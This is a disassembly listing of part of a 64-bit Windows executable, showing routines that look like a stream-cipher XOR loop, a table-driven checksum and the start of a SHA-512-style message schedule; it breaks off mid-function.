   140007392:	8b 83 e4 0f 00 00    	mov    0xfe4(%rbx),%eax
   140007398:	89 83 64 10 00 00    	mov    %eax,0x1064(%rbx)
   14000739e:	8b 83 e8 0f 00 00    	mov    0xfe8(%rbx),%eax
   1400073a4:	89 83 68 10 00 00    	mov    %eax,0x1068(%rbx)
   1400073aa:	8b 83 ec 0f 00 00    	mov    0xfec(%rbx),%eax
   1400073b0:	89 83 6c 10 00 00    	mov    %eax,0x106c(%rbx)
   1400073b6:	8b 83 f0 0f 00 00    	mov    0xff0(%rbx),%eax
   1400073bc:	89 83 70 10 00 00    	mov    %eax,0x1070(%rbx)
   1400073c2:	8b 83 f4 0f 00 00    	mov    0xff4(%rbx),%eax
   1400073c8:	89 83 74 10 00 00    	mov    %eax,0x1074(%rbx)
   1400073ce:	8b 83 f8 0f 00 00    	mov    0xff8(%rbx),%eax
   1400073d4:	89 83 78 10 00 00    	mov    %eax,0x1078(%rbx)
   1400073da:	8b 83 fc 0f 00 00    	mov    0xffc(%rbx),%eax
   1400073e0:	89 83 7c 10 00 00    	mov    %eax,0x107c(%rbx)
   1400073e6:	48 8b cb             	mov    %rbx,%rcx
   1400073e9:	e8 52 f1 ff ff       	call   0x140006540
   1400073ee:	48 83 ef 01          	sub    $0x1,%rdi
   1400073f2:	75 f2                	jne    0x1400073e6
   1400073f4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400073f9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400073fe:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140007403:	48 83 c4 20          	add    $0x20,%rsp
   140007407:	41 5e                	pop    %r14
   140007409:	c3                   	ret
   14000740a:	cc                   	int3
   14000740b:	cc                   	int3
   14000740c:	cc                   	int3
   14000740d:	cc                   	int3
   14000740e:	cc                   	int3
   14000740f:	cc                   	int3
   140007410:	40 55                	rex push %rbp
   140007412:	56                   	push   %rsi
   140007413:	41 55                	push   %r13
   140007415:	41 56                	push   %r14
   140007417:	41 57                	push   %r15
   140007419:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140007420:	48 8b 05 d9 3b 00 00 	mov    0x3bd9(%rip),%rax        # 0x14000b000
   140007427:	48 33 c4             	xor    %rsp,%rax
   14000742a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000742f:	44 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%r15d
   140007436:	00 
   140007437:	45 33 f6             	xor    %r14d,%r14d
   14000743a:	49 8b f1             	mov    %r9,%rsi
   14000743d:	49 8b e8             	mov    %r8,%rbp
   140007440:	4c 8b ea             	mov    %rdx,%r13
   140007443:	41 83 ff 40          	cmp    $0x40,%r15d
   140007447:	0f 82 d5 00 00 00    	jb     0x140007522
   14000744d:	48 89 9c 24 b0 00 00 	mov    %rbx,0xb0(%rsp)
   140007454:	00 
   140007455:	49 8d 59 3c          	lea    0x3c(%r9),%rbx
   140007459:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   14000745e:	49 8d 78 3c          	lea    0x3c(%r8),%rdi
   140007462:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   140007467:	45 8b e7             	mov    %r15d,%r12d
   14000746a:	49 c1 ec 06          	shr    $0x6,%r12
   14000746e:	66 90                	xchg   %ax,%ax
   140007470:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140007475:	49 8b cd             	mov    %r13,%rcx
   140007478:	e8 03 e5 ff ff       	call   0x140005980
   14000747d:	48 8d 4c 24 5c       	lea    0x5c(%rsp),%rcx
   140007482:	49 8b c6             	mov    %r14,%rax
   140007485:	48 3b f1             	cmp    %rcx,%rsi
   140007488:	77 0a                	ja     0x140007494
   14000748a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000748f:	48 3b d9             	cmp    %rcx,%rbx
   140007492:	73 0c                	jae    0x1400074a0
   140007494:	48 3b f7             	cmp    %rdi,%rsi
   140007497:	77 1e                	ja     0x1400074b7
   140007499:	48 3b dd             	cmp    %rbp,%rbx
   14000749c:	72 19                	jb     0x1400074b7
   14000749e:	66 90                	xchg   %ax,%ax
   1400074a0:	8b 4c 87 c4          	mov    -0x3c(%rdi,%rax,4),%ecx
   1400074a4:	33 4c 84 20          	xor    0x20(%rsp,%rax,4),%ecx
   1400074a8:	89 4c 83 c4          	mov    %ecx,-0x3c(%rbx,%rax,4)
   1400074ac:	48 ff c0             	inc    %rax
   1400074af:	48 83 f8 10          	cmp    $0x10,%rax
   1400074b3:	7c eb                	jl     0x1400074a0
   1400074b5:	eb 3b                	jmp    0x1400074f2
   1400074b7:	f3 0f 6f 45 00       	movdqu 0x0(%rbp),%xmm0
   1400074bc:	f3 0f 6f 4f d4       	movdqu -0x2c(%rdi),%xmm1
   1400074c1:	0f 57 44 24 20       	xorps  0x20(%rsp),%xmm0
   1400074c6:	0f 57 4c 24 30       	xorps  0x30(%rsp),%xmm1
   1400074cb:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400074cf:	f3 0f 6f 47 e4       	movdqu -0x1c(%rdi),%xmm0
   1400074d4:	f3 0f 7f 4b d4       	movdqu %xmm1,-0x2c(%rbx)
   1400074d9:	f3 0f 6f 4f f4       	movdqu -0xc(%rdi),%xmm1
   1400074de:	0f 57 44 24 40       	xorps  0x40(%rsp),%xmm0
   1400074e3:	0f 57 4c 24 50       	xorps  0x50(%rsp),%xmm1
   1400074e8:	f3 0f 7f 43 e4       	movdqu %xmm0,-0x1c(%rbx)
   1400074ed:	f3 0f 7f 4b f4       	movdqu %xmm1,-0xc(%rbx)
   1400074f2:	41 83 c7 c0          	add    $0xffffffc0,%r15d
   1400074f6:	48 83 c5 40          	add    $0x40,%rbp
   1400074fa:	48 83 c7 40          	add    $0x40,%rdi
   1400074fe:	48 83 c6 40          	add    $0x40,%rsi
   140007502:	48 83 c3 40          	add    $0x40,%rbx
   140007506:	49 83 ec 01          	sub    $0x1,%r12
   14000750a:	0f 85 60 ff ff ff    	jne    0x140007470
   140007510:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   140007515:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000751a:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   140007521:	00 
   140007522:	45 85 ff             	test   %r15d,%r15d
   140007525:	0f 84 48 01 00 00    	je     0x140007673
   14000752b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140007530:	49 8b cd             	mov    %r13,%rcx
   140007533:	e8 48 e4 ff ff       	call   0x140005980
   140007538:	41 83 ff 08          	cmp    $0x8,%r15d
   14000753c:	0f 82 f4 00 00 00    	jb     0x140007636
   140007542:	41 8d 47 ff          	lea    -0x1(%r15),%eax
   140007546:	8b c8                	mov    %eax,%ecx
   140007548:	48 8d 14 30          	lea    (%rax,%rsi,1),%rdx
   14000754c:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140007551:	48 03 c1             	add    %rcx,%rax
   140007554:	48 3b f0             	cmp    %rax,%rsi
   140007557:	77 0e                	ja     0x140007567
   140007559:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000755e:	48 3b d0             	cmp    %rax,%rdx
   140007561:	0f 83 cf 00 00 00    	jae    0x140007636
   140007567:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   14000756b:	48 3b f0             	cmp    %rax,%rsi
   14000756e:	77 09                	ja     0x140007579
   140007570:	48 3b d5             	cmp    %rbp,%rdx
   140007573:	0f 83 bd 00 00 00    	jae    0x140007636
   140007579:	41 83 ff 40          	cmp    $0x40,%r15d
   14000757d:	0f 82 89 00 00 00    	jb     0x14000760c
   140007583:	41 8b d7             	mov    %r15d,%edx
   140007586:	45 8b c7             	mov    %r15d,%r8d
   140007589:	83 e2 3f             	and    $0x3f,%edx
   14000758c:	44 2b c2             	sub    %edx,%r8d
   14000758f:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140007595:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000759c:	00 00 00 00 
   1400075a0:	41 8b c6             	mov    %r14d,%eax
   1400075a3:	41 83 c6 40          	add    $0x40,%r14d
   1400075a7:	f3 0f 6f 04 28       	movdqu (%rax,%rbp,1),%xmm0
   1400075ac:	f3 0f 6f 4c 04 20    	movdqu 0x20(%rsp,%rax,1),%xmm1
   1400075b2:	0f 57 c8             	xorps  %xmm0,%xmm1
   1400075b5:	f3 0f 7f 0c 06       	movdqu %xmm1,(%rsi,%rax,1)
   1400075ba:	41 8d 41 f0          	lea    -0x10(%r9),%eax
   1400075be:	f3 0f 6f 04 28       	movdqu (%rax,%rbp,1),%xmm0
   1400075c3:	f3 0f 6f 4c 04 20    	movdqu 0x20(%rsp,%rax,1),%xmm1
   1400075c9:	0f 57 c8             	xorps  %xmm0,%xmm1
   1400075cc:	f3 0f 7f 0c 06       	movdqu %xmm1,(%rsi,%rax,1)
   1400075d1:	41 8b c1             	mov    %r9d,%eax
   1400075d4:	f3 0f 6f 04 28       	movdqu (%rax,%rbp,1),%xmm0
   1400075d9:	f3 0f 6f 4c 04 20    	movdqu 0x20(%rsp,%rax,1),%xmm1
   1400075df:	0f 57 c8             	xorps  %xmm0,%xmm1
   1400075e2:	f3 0f 7f 0c 06       	movdqu %xmm1,(%rsi,%rax,1)
   1400075e7:	41 8d 41 10          	lea    0x10(%r9),%eax
   1400075eb:	41 83 c1 40          	add    $0x40,%r9d
   1400075ef:	f3 0f 6f 4c 04 20    	movdqu 0x20(%rsp,%rax,1),%xmm1
   1400075f5:	f3 0f 6f 04 28       	movdqu (%rax,%rbp,1),%xmm0
   1400075fa:	0f 57 c8             	xorps  %xmm0,%xmm1
   1400075fd:	f3 0f 7f 0c 06       	movdqu %xmm1,(%rsi,%rax,1)
   140007602:	45 3b f0             	cmp    %r8d,%r14d
   140007605:	72 99                	jb     0x1400075a0
   140007607:	83 fa 08             	cmp    $0x8,%edx
   14000760a:	72 25                	jb     0x140007631
   14000760c:	41 8b cf             	mov    %r15d,%ecx
   14000760f:	83 e1 f8             	and    $0xfffffff8,%ecx
   140007612:	41 8b c6             	mov    %r14d,%eax
   140007615:	41 83 c6 08          	add    $0x8,%r14d
   140007619:	f3 0f 7e 4c 04 20    	movq   0x20(%rsp,%rax,1),%xmm1
   14000761f:	f3 0f 7e 04 28       	movq   (%rax,%rbp,1),%xmm0
   140007624:	0f 57 c8             	xorps  %xmm0,%xmm1
   140007627:	66 0f d6 0c 06       	movq   %xmm1,(%rsi,%rax,1)
   14000762c:	44 3b f1             	cmp    %ecx,%r14d
   14000762f:	72 e1                	jb     0x140007612
   140007631:	45 3b f7             	cmp    %r15d,%r14d
   140007634:	73 3d                	jae    0x140007673
   140007636:	41 8b c6             	mov    %r14d,%eax
   140007639:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000763e:	48 03 c8             	add    %rax,%rcx
   140007641:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140007646:	48 2b e8             	sub    %rax,%rbp
   140007649:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000764e:	48 2b f0             	sub    %rax,%rsi
   140007651:	45 2b fe             	sub    %r14d,%r15d
   140007654:	41 8b d7             	mov    %r15d,%edx
   140007657:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000765e:	00 00 
   140007660:	0f b6 04 29          	movzbl (%rcx,%rbp,1),%eax
   140007664:	32 01                	xor    (%rcx),%al
   140007666:	88 04 0e             	mov    %al,(%rsi,%rcx,1)
   140007669:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000766d:	48 83 ea 01          	sub    $0x1,%rdx
   140007671:	75 ed                	jne    0x140007660
   140007673:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140007678:	48 33 cc             	xor    %rsp,%rcx
   14000767b:	e8 60 23 00 00       	call   0x1400099e0
   140007680:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140007687:	41 5f                	pop    %r15
   140007689:	41 5e                	pop    %r14
   14000768b:	41 5d                	pop    %r13
   14000768d:	5e                   	pop    %rsi
   14000768e:	5d                   	pop    %rbp
   14000768f:	c3                   	ret
   140007690:	b8 64 6f 6e 67       	mov    $0x676e6f64,%eax
   140007695:	4c 8d 41 02          	lea    0x2(%rcx),%r8
   140007699:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000769f:	4c 8d 15 da 9e ff ff 	lea    -0x6126(%rip),%r10        # 0x140001580
   1400076a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400076ad:	00 00 00 
   1400076b0:	41 0f b6 50 fe       	movzbl -0x2(%r8),%edx
   1400076b5:	8b c8                	mov    %eax,%ecx
   1400076b7:	48 c1 e9 18          	shr    $0x18,%rcx
   1400076bb:	48 33 d1             	xor    %rcx,%rdx
   1400076be:	c1 e0 08             	shl    $0x8,%eax
   1400076c1:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400076c5:	41 0f b6 50 ff       	movzbl -0x1(%r8),%edx
   1400076ca:	8b c8                	mov    %eax,%ecx
   1400076cc:	48 c1 e9 18          	shr    $0x18,%rcx
   1400076d0:	48 33 d1             	xor    %rcx,%rdx
   1400076d3:	c1 e0 08             	shl    $0x8,%eax
   1400076d6:	41 0f b6 08          	movzbl (%r8),%ecx
   1400076da:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400076de:	8b d0                	mov    %eax,%edx
   1400076e0:	48 c1 ea 18          	shr    $0x18,%rdx
   1400076e4:	48 33 d1             	xor    %rcx,%rdx
   1400076e7:	c1 e0 08             	shl    $0x8,%eax
   1400076ea:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400076ee:	41 0f b6 50 01       	movzbl 0x1(%r8),%edx
   1400076f3:	8b c8                	mov    %eax,%ecx
   1400076f5:	48 c1 e9 18          	shr    $0x18,%rcx
   1400076f9:	48 33 d1             	xor    %rcx,%rdx
   1400076fc:	c1 e0 08             	shl    $0x8,%eax
   1400076ff:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007703:	41 0f b6 50 02       	movzbl 0x2(%r8),%edx
   140007708:	8b c8                	mov    %eax,%ecx
   14000770a:	48 c1 e9 18          	shr    $0x18,%rcx
   14000770e:	48 33 d1             	xor    %rcx,%rdx
   140007711:	c1 e0 08             	shl    $0x8,%eax
   140007714:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007718:	41 0f b6 50 03       	movzbl 0x3(%r8),%edx
   14000771d:	8b c8                	mov    %eax,%ecx
   14000771f:	48 c1 e9 18          	shr    $0x18,%rcx
   140007723:	48 33 d1             	xor    %rcx,%rdx
   140007726:	c1 e0 08             	shl    $0x8,%eax
   140007729:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   14000772d:	41 0f b6 50 04       	movzbl 0x4(%r8),%edx
   140007732:	8b c8                	mov    %eax,%ecx
   140007734:	48 c1 e9 18          	shr    $0x18,%rcx
   140007738:	48 33 d1             	xor    %rcx,%rdx
   14000773b:	c1 e0 08             	shl    $0x8,%eax
   14000773e:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007742:	41 0f b6 50 05       	movzbl 0x5(%r8),%edx
   140007747:	8b c8                	mov    %eax,%ecx
   140007749:	48 c1 e9 18          	shr    $0x18,%rcx
   14000774d:	48 33 d1             	xor    %rcx,%rdx
   140007750:	c1 e0 08             	shl    $0x8,%eax
   140007753:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007757:	41 0f b6 50 06       	movzbl 0x6(%r8),%edx
   14000775c:	8b c8                	mov    %eax,%ecx
   14000775e:	48 c1 e9 18          	shr    $0x18,%rcx
   140007762:	48 33 d1             	xor    %rcx,%rdx
   140007765:	c1 e0 08             	shl    $0x8,%eax
   140007768:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   14000776c:	41 0f b6 50 07       	movzbl 0x7(%r8),%edx
   140007771:	8b c8                	mov    %eax,%ecx
   140007773:	48 c1 e9 18          	shr    $0x18,%rcx
   140007777:	48 33 d1             	xor    %rcx,%rdx
   14000777a:	c1 e0 08             	shl    $0x8,%eax
   14000777d:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007781:	41 0f b6 50 08       	movzbl 0x8(%r8),%edx
   140007786:	8b c8                	mov    %eax,%ecx
   140007788:	48 c1 e9 18          	shr    $0x18,%rcx
   14000778c:	48 33 d1             	xor    %rcx,%rdx
   14000778f:	c1 e0 08             	shl    $0x8,%eax
   140007792:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007796:	41 0f b6 50 09       	movzbl 0x9(%r8),%edx
   14000779b:	8b c8                	mov    %eax,%ecx
   14000779d:	48 c1 e9 18          	shr    $0x18,%rcx
   1400077a1:	48 33 d1             	xor    %rcx,%rdx
   1400077a4:	c1 e0 08             	shl    $0x8,%eax
   1400077a7:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400077ab:	41 0f b6 50 0a       	movzbl 0xa(%r8),%edx
   1400077b0:	8b c8                	mov    %eax,%ecx
   1400077b2:	48 c1 e9 18          	shr    $0x18,%rcx
   1400077b6:	48 33 d1             	xor    %rcx,%rdx
   1400077b9:	c1 e0 08             	shl    $0x8,%eax
   1400077bc:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400077c0:	41 0f b6 50 0b       	movzbl 0xb(%r8),%edx
   1400077c5:	8b c8                	mov    %eax,%ecx
   1400077c7:	48 c1 e9 18          	shr    $0x18,%rcx
   1400077cb:	48 33 d1             	xor    %rcx,%rdx
   1400077ce:	c1 e0 08             	shl    $0x8,%eax
   1400077d1:	4d 8d 40 10          	lea    0x10(%r8),%r8
   1400077d5:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400077d9:	41 0f b6 50 fc       	movzbl -0x4(%r8),%edx
   1400077de:	8b c8                	mov    %eax,%ecx
   1400077e0:	48 c1 e9 18          	shr    $0x18,%rcx
   1400077e4:	48 33 d1             	xor    %rcx,%rdx
   1400077e7:	c1 e0 08             	shl    $0x8,%eax
   1400077ea:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   1400077ee:	41 0f b6 50 fd       	movzbl -0x3(%r8),%edx
   1400077f3:	8b c8                	mov    %eax,%ecx
   1400077f5:	48 c1 e9 18          	shr    $0x18,%rcx
   1400077f9:	48 33 d1             	xor    %rcx,%rdx
   1400077fc:	c1 e0 08             	shl    $0x8,%eax
   1400077ff:	41 33 04 92          	xor    (%r10,%rdx,4),%eax
   140007803:	49 83 e9 01          	sub    $0x1,%r9
   140007807:	0f 85 a3 fe ff ff    	jne    0x1400076b0
   14000780d:	c3                   	ret
   14000780e:	cc                   	int3
   14000780f:	cc                   	int3
   140007810:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007815:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000781a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000781f:	55                   	push   %rbp
   140007820:	41 54                	push   %r12
   140007822:	41 55                	push   %r13
   140007824:	41 56                	push   %r14
   140007826:	41 57                	push   %r15
   140007828:	48 8d ac 24 c0 fc ff 	lea    -0x340(%rsp),%rbp
   14000782f:	ff 
   140007830:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   140007837:	48 8b 05 c2 37 00 00 	mov    0x37c2(%rip),%rax        # 0x14000b000
   14000783e:	48 33 c4             	xor    %rsp,%rax
   140007841:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140007848:	0f 10 02             	movups (%rdx),%xmm0
   14000784b:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
   14000784f:	4c 8d a5 20 01 00 00 	lea    0x120(%rbp),%r12
   140007856:	0f 10 4a 10          	movups 0x10(%rdx),%xmm1
   14000785a:	48 c7 44 24 78 20 00 	movq   $0x20,0x78(%rsp)
   140007861:	00 00 
   140007863:	0f 29 85 b0 00 00 00 	movaps %xmm0,0xb0(%rbp)
   14000786a:	0f 10 42 20          	movups 0x20(%rdx),%xmm0
   14000786e:	0f 29 8d c0 00 00 00 	movaps %xmm1,0xc0(%rbp)
   140007875:	0f 10 4a 30          	movups 0x30(%rdx),%xmm1
   140007879:	0f 29 85 d0 00 00 00 	movaps %xmm0,0xd0(%rbp)
   140007880:	0f 10 42 40          	movups 0x40(%rdx),%xmm0
   140007884:	0f 29 8d e0 00 00 00 	movaps %xmm1,0xe0(%rbp)
   14000788b:	0f 10 4a 50          	movups 0x50(%rdx),%xmm1
   14000788f:	0f 29 85 f0 00 00 00 	movaps %xmm0,0xf0(%rbp)
   140007896:	0f 10 42 60          	movups 0x60(%rdx),%xmm0
   14000789a:	0f 29 8d 00 01 00 00 	movaps %xmm1,0x100(%rbp)
   1400078a1:	0f 10 4a 70          	movups 0x70(%rdx),%xmm1
   1400078a5:	0f 29 85 10 01 00 00 	movaps %xmm0,0x110(%rbp)
   1400078ac:	0f 29 8d 20 01 00 00 	movaps %xmm1,0x120(%rbp)
   1400078b3:	66 0f 7e c8          	movd   %xmm1,%eax
   1400078b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400078be:	00 00 
   1400078c0:	45 8b 7c 24 98       	mov    -0x68(%r12),%r15d
   1400078c5:	45 8b f7             	mov    %r15d,%r14d
   1400078c8:	45 8b 6c 24 9c       	mov    -0x64(%r12),%r13d
   1400078cd:	41 8b d7             	mov    %r15d,%edx
   1400078d0:	41 8b 74 24 04       	mov    0x4(%r12),%esi
   1400078d5:	41 8b cd             	mov    %r13d,%ecx
   1400078d8:	45 8b 5c 24 dc       	mov    -0x24(%r12),%r11d
   1400078dd:	41 8b df             	mov    %r15d,%ebx
   1400078e0:	45 8b 4c 24 94       	mov    -0x6c(%r12),%r9d
   1400078e5:	c1 e9 08             	shr    $0x8,%ecx
   1400078e8:	c1 e2 19             	shl    $0x19,%edx
   1400078eb:	8d 3c f5 00 00 00 00 	lea    0x0(,%rsi,8),%edi
   1400078f2:	d1 eb                	shr    $1,%ebx
   1400078f4:	41 c1 e6 18          	shl    $0x18,%r14d
   1400078f8:	44 0b f1             	or     %ecx,%r14d
   1400078fb:	4c 89 65 80          	mov    %r12,-0x80(%rbp)
   1400078ff:	41 8b cd             	mov    %r13d,%ecx
   140007902:	c1 e9 07             	shr    $0x7,%ecx
   140007905:	0b d1                	or     %ecx,%edx
   140007907:	41 8b cd             	mov    %r13d,%ecx
   14000790a:	44 33 f2             	xor    %edx,%r14d
   14000790d:	d1 e9                	shr    $1,%ecx
   14000790f:	41 8b d7             	mov    %r15d,%edx
   140007912:	c1 e2 1f             	shl    $0x1f,%edx
   140007915:	0b d1                	or     %ecx,%edx
   140007917:	8b c8                	mov    %eax,%ecx
   140007919:	44 33 f2             	xor    %edx,%r14d
   14000791c:	c1 e9 1d             	shr    $0x1d,%ecx
   14000791f:	0b f9                	or     %ecx,%edi
   140007921:	8b d6                	mov    %esi,%edx
   140007923:	c1 ea 06             	shr    $0x6,%edx
   140007926:	8b c8                	mov    %eax,%ecx
   140007928:	c1 e1 1a             	shl    $0x1a,%ecx
   14000792b:	0b d1                	or     %ecx,%edx
   14000792d:	8b c8                	mov    %eax,%ecx
   14000792f:	33 fa                	xor    %edx,%edi
   140007931:	c1 e1 0d             	shl    $0xd,%ecx
   140007934:	8b d6                	mov    %esi,%edx
   140007936:	c1 ea 13             	shr    $0x13,%edx
   140007939:	0b d1                	or     %ecx,%edx
   14000793b:	41 8b cd             	mov    %r13d,%ecx
   14000793e:	c1 e1 1f             	shl    $0x1f,%ecx
   140007941:	33 fa                	xor    %edx,%edi
   140007943:	0b d9                	or     %ecx,%ebx
   140007945:	41 03 fe             	add    %r14d,%edi
   140007948:	41 8b cd             	mov    %r13d,%ecx
   14000794b:	41 8b d7             	mov    %r15d,%edx
   14000794e:	c1 e1 18             	shl    $0x18,%ecx
   140007951:	c1 ea 08             	shr    $0x8,%edx
   140007954:	0b d1                	or     %ecx,%edx
   140007956:	45 8d 14 3b          	lea    (%r11,%rdi,1),%r10d
   14000795a:	33 da                	xor    %edx,%ebx
   14000795c:	47 8d 04 11          	lea    (%r9,%r10,1),%r8d
   140007960:	8b d6                	mov    %esi,%edx
   140007962:	45 89 44 24 14       	mov    %r8d,0x14(%r12)
   140007967:	c1 e2 0d             	shl    $0xd,%edx
   14000796a:	41 8b cf             	mov    %r15d,%ecx
   14000796d:	c1 e9 07             	shr    $0x7,%ecx
   140007970:	33 d9                	xor    %ecx,%ebx
   140007972:	c1 ee 1d             	shr    $0x1d,%esi
   140007975:	8b c8                	mov    %eax,%ecx
   140007977:	c1 e9 13             	shr    $0x13,%ecx
   14000797a:	0b d1                	or     %ecx,%edx
   14000797c:	8d 0c c5 00 00 00 00 	lea    0x0(,%rax,8),%ecx
   140007983:	0b f1                	or     %ecx,%esi
   140007985:	c1 e8 06             	shr    $0x6,%eax
   140007988:	33 d6                	xor    %esi,%edx
   14000798a:	49 8d 4c 24 10       	lea    0x10(%r12),%rcx
   14000798f:	33 d0                	xor    %eax,%edx
   140007991:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   140007995:	41 8b 44 24 d8       	mov    -0x28(%r12),%eax
   14000799a:	03 da                	add    %edx,%ebx
   14000799c:	45 3b c1             	cmp    %r9d,%r8d
   14000799f:	83 d3 00             	adc    $0x0,%ebx
   1400079a2:	45 3b d3             	cmp    %r11d,%r10d
   1400079a5:	83 d3 00             	adc    $0x0,%ebx
   1400079a8:	41 3b fe             	cmp    %r14d,%edi
   1400079ab:	45 8b 74 24 0c       	mov    0xc(%r12),%r14d
   1400079b0:	41 13 5c 24 90       	adc    -0x70(%r12),%ebx
   1400079b5:	03 c3                	add    %ebx,%eax
   1400079b7:	89 01                	mov    %eax,(%rcx)
   1400079b9:	45 8b 7c 24 08       	mov    0x8(%r12),%r15d
   1400079be:	45 8b cf             	mov    %r15d,%r9d
   1400079c1:	41 8b 7c 24 a4       	mov    -0x5c(%r12),%edi
   1400079c6:	8b cf                	mov    %edi,%ecx
   1400079c8:	41 8b 74 24 a0       	mov    -0x60(%r12),%esi
   1400079cd:	44 8b e6             	mov    %esi,%r12d
   1400079d0:	c1 e9 08             	shr    $0x8,%ecx
   1400079d3:	8b d6                	mov    %esi,%edx
   1400079d5:	c1 e2 19             	shl    $0x19,%edx
   1400079d8:	8b de                	mov    %esi,%ebx
   1400079da:	d1 eb                	shr    $1,%ebx
   1400079dc:	41 c1 e4 18          	shl    $0x18,%r12d
   1400079e0:	44 0b e1             	or     %ecx,%r12d
   1400079e3:	41 c1 e1 0d          	shl    $0xd,%r9d
   1400079e7:	8b cf                	mov    %edi,%ecx
   1400079e9:	c1 e9 07             	shr    $0x7,%ecx
   1400079ec:	0b d1                	or     %ecx,%edx
   1400079ee:	8b cf                	mov    %edi,%ecx
   1400079f0:	d1 e9                	shr    $1,%ecx
   1400079f2:	44 33 e2             	xor    %edx,%r12d
   1400079f5:	8b d6                	mov    %esi,%edx
   1400079f7:	c1 e2 1f             	shl    $0x1f,%edx
   1400079fa:	0b d1                	or     %ecx,%edx
   1400079fc:	41 8b ce             	mov    %r14d,%ecx
   1400079ff:	c1 e9 13             	shr    $0x13,%ecx
   140007a02:	44 33 e2             	xor    %edx,%r12d
   140007a05:	44 0b c9             	or     %ecx,%r9d
   140007a08:	41 8b d7             	mov    %r15d,%edx
   140007a0b:	c1 e2 1a             	shl    $0x1a,%edx
   140007a0e:	41 8b ce             	mov    %r14d,%ecx
   140007a11:	c1 e9 06             	shr    $0x6,%ecx
   140007a14:	0b d1                	or     %ecx,%edx
   140007a16:	42 8d 0c f5 00 00 00 	lea    0x0(,%r14,8),%ecx
   140007a1d:	00 
   140007a1e:	44 33 ca             	xor    %edx,%r9d
   140007a21:	41 8b d7             	mov    %r15d,%edx
   140007a24:	c1 ea 1d             	shr    $0x1d,%edx
   140007a27:	0b d1                	or     %ecx,%edx
   140007a29:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140007a2d:	44 33 ca             	xor    %edx,%r9d
   140007a30:	42 8d 14 fd 00 00 00 	lea    0x0(,%r15,8),%edx
   140007a37:	00 
   140007a38:	45 03 cc             	add    %r12d,%r9d
   140007a3b:	44 8b 59 e4          	mov    -0x1c(%rcx),%r11d
   140007a3f:	47 8d 14 0b          	lea    (%r11,%r9,1),%r10d
   140007a43:	47 8d 04 2a          	lea    (%r10,%r13,1),%r8d
   140007a47:	44 89 41 1c          	mov    %r8d,0x1c(%rcx)
   140007a4b:	8b cf                	mov    %edi,%ecx
   140007a4d:	c1 e1 1f             	shl    $0x1f,%ecx
   140007a50:	0b d9                	or     %ecx,%ebx
   140007a52:	c1 e7 18             	shl    $0x18,%edi
   140007a55:	8b ce                	mov    %esi,%ecx
   140007a57:	c1 ee 07             	shr    $0x7,%esi
   140007a5a:	c1 e9 08             	shr    $0x8,%ecx
   140007a5d:	0b cf                	or     %edi,%ecx
   140007a5f:	33 d9                	xor    %ecx,%ebx
   140007a61:	41 8b ce             	mov    %r14d,%ecx
   140007a64:	c1 e9 1d             	shr    $0x1d,%ecx
   140007a67:	33 de                	xor    %esi,%ebx
   140007a69:	0b d1                	or     %ecx,%edx
   140007a6b:	41 c1 e6 0d          	shl    $0xd,%r14d
   140007a6f:	41 8b cf             	mov    %r15d,%ecx
   140007a72:	41 c1 ef 06          	shr    $0x6,%r15d
   140007a76:	c1 e9 13             	shr    $0x13,%ecx
   140007a79:	41 0b ce             	or     %r14d,%ecx
   140007a7c:	33 d1                	xor    %ecx,%edx
   140007a7e:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140007a82:	41 33 d7             	xor    %r15d,%edx
   140007a85:	03 da                	add    %edx,%ebx
